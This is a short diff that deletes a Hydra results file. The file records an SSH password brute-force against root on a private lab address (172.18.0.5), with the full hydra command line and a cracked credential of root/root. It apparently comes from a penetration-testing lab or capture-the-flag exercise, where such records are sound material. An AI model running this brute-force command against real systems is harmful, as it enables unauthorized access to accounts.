@@ -1,2 +1,0 @@
-# Hydra v9.0 run at 2025-02-27 15:13:44 on 172.18.0.5 ssh (hydra -l root -P passwords.txt -o capture-results/hydra.txt -V -I -t 10 172.18.0.5 ssh)
-[22][ssh] host: 172.18.0.5   login: root   password: root
